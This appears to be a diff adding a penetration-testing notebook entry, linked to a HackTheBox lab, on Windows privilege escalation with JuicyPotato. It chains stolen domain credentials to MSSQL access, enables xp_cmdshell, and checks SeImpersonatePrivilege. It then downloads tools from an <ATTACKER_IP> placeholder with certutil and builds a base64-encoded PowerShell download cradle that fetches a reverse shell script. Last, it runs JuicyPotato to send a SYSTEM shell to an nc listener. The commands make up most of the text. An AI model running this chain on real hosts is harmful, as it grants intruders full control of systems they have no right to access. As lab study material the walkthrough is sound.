@@ -1,0 +1,196 @@
+---
+Primary_category: "[[SEIMPERSONATEPRIVILEGE & SEASSIGNPRIMARYTOKENPRIVILEGE]]"
+title: ""
+draft: true
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+  - card-list
+  - purple-style
+---
+
+###### PRIMARY CATEGORY → [[SEIMPERSONATEPRIVILEGE & SEASSIGNPRIMARYTOKENPRIVILEGE|SEIMPERSONATEPRIVILEGE]]
+
+#### *JuicyPotato*
+
+> ***RCE as LOCAL SYSTEM***
+
+Let's suppose we gain access privileged access to a *domain-joined* machine and we find out a *creds.txt* file located on the *Administrator's* desktop folder
+
+It contains credentials of a *domain user* account which has privileges over a *MSSQL* instance of *domain-joined MSSQL* server
+
+##### *Connecting to the MSSQL Instance*
+
+Therefore, we can leverage this credentials to establish a connection to the *MSSQL* instance as the given principal
+
+To do so, we can proceed as follows
+
+> ***[Impacket's MSSQLClient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)***
+
+```bash
+mssqlclient.py -dc-ip '<DC>' -windows-auth '<DOMAIN>/<USER>:<PASSWD>@<MSSQL_SERVER>'
+```
+
+##### *Gaining Code Execution through the XP_CMDSHELL Procedure*
+
+Since the given domain user account has a *sysadmin* role within the *MSSQL instance*, we can enable the ***[[1433 - MSSQL#Enable xp_cmdshell|XP_CMDSHELL]]*** stored procedure to be able to run system commands as the given domain or local service account
+
+###### *Enabling XP_CMDSHELL*
+
+```bash
+SQL> enable_xp_cmdshell
+```
+
+###### *Running System Commands*
+
+```bash
+SQL> xp_cmdshell <COMMAND>
+```
+
+##### *Verifying Sensitive Privileges*
+
+###### *Retrieving the Service Account Name*
+
+First, we can run the following command to retrieve the name of the service account running the *MSSQL* instance
+
+```bash
+SQL> xp_cmdshell whoami
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> nt service\mssql$sqlexpress01
+> ```
+>
+
+And we are able to run commands as a *LOCAL SERVICE* account
+
+###### *Verifying the Service Account Privileges*
+
+Most of the *LOCAL SERVICE* accounts typically have sensitive privileges such as ***[[SEIMPERSONATEPRIVILEGE & SEASSIGNPRIMARYTOKENPRIVILEGE|seImpersonatePriviliege]]*** enabled
+
+If so, we can leverage the latter to ***[[MITM & COERCED AUTHS|coerce]]*** a process running as *LOCAL SYSTEM* to authenticate itself to an *IPC* endpoint that we have set up previously
+
+This way we will have an specific thread running under the security context of the *LOCAL SYSTEM* account through client impersonation carried out by us by leveraging the *seImpersonatePrivilege* of the *LOCAL SERVICE* account
+
+From here, we call the following *API Functions* → 
+
+- ***[OpenThreadToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken) → Get a handler pointing to the Thread's Impersonation Token***
+
+- ***[DuplicateTokenEx(...TokenType=TokenPrimary)](https://learn.microsoft.com/es-es/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex) → Duplicate the Impersonation Token and obtain a Primary Token***
+
+- ***[CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) or [CreateProcessAsUser](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) → Create a new process associated with the New Primary Token and thus running under the security context of LOCAL SYSTEM***
+
+So, in order to carry out the workflow in question, we must have the *seImpersonatePrivilege* enabled, we can verify this as follows
+
+```bash
+SQL> xp_cmdshell whoami /priv
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PRIVILEGES INFORMATION                                                             
+> ----------------------                                                             
+> Privilege Name                Description                               State      
+> 
+> ============================= ========================================= ========   
+> 
+> SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+> SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+> SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+> SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
+> SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+> SeCreateGlobalPrivilege       Create global objects                     Enabled    
+> SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+> ```
+>
+
+And it is!
+
+Therefore, we can upload a ***[JuicyPotato](https://github.com/ohpe/juicy-potato)*** binary to the target in order to send a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]*** as *LOCAL SYSTEM* to our attacker machine
+
+##### *Getting Command Execution as LOCAL SYSTEM*
+
+###### *Downloading the JuicyPotato executable*
+
+> ***From the attacker*** ⚔️
+
+```bash
+curl --silent --location --request GET 'https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe' --remote-name
+```
+
+###### *Transferring JuicyPotato to the Target*
+
+> ***From the attacker*** ⚔️
+
+```bash
+python3 -m http.server 80
+```
+
+> ***From the target*** 🎯
+
+```bash
+mkdir C:\Windows\Temp\LPE
+cd C:\Windows\Temp\LPE
+```
+
+```bash
+certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/JuicyPotato.exe'
+```
+
+###### *Downloading a PS Reverse Shell Oneliner*
+
+> ***From the attacker*** ⚔️
+
+```bash
+curl --silent --location --request GET 'https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1' --output rev.ps1
+```
+
+Then, we edit it and replace the *IP Address* and *TCP Port* with our own
+
+###### *Setting up the PS Command we will pass to the JuicyPotato Binary*
+
+> ***From the attacker*** ⚔️
+
+```bash
+echo -n 'IEX (New-Object Net.WebClient).downloadString("http://<ATTACKER_IP>/rev.ps1")' | iconv --from-code UTF-8 --to-code UTF-16LE | base64 -w 0 ; echo
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABBAFQAVABBAEMASwBFAFIAXwBJAFAAPgAvAHIAZQB2AC4AcABzADEAIgApAA==
+> ```
+>
+
+###### *Setting up a TCP Listener*
+
+> ***From the attacker*** ⚔️
+
+> ***Same TCP Port as the one specified in rev.ps1***
+
+```bash
+rlwrap -CaR nc -nlvp <PORT>
+```
+
+###### *Running the Exploit*
+
+> ***From the target*** 🎯
+
+```bash
+.\JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3...AA=="
+```
+
+Then, we will receive an incoming *reverse shell* as *LOCAL SYSTEM*
+
+---
+
+#### *Examples*
+
+- ![](https://www.hackthebox.com/images/landingv3/mega-menu-ctf.webp)
+	- [[JEEVES#Privesc - Unintended way|JEEVES]]
+	
+<br>
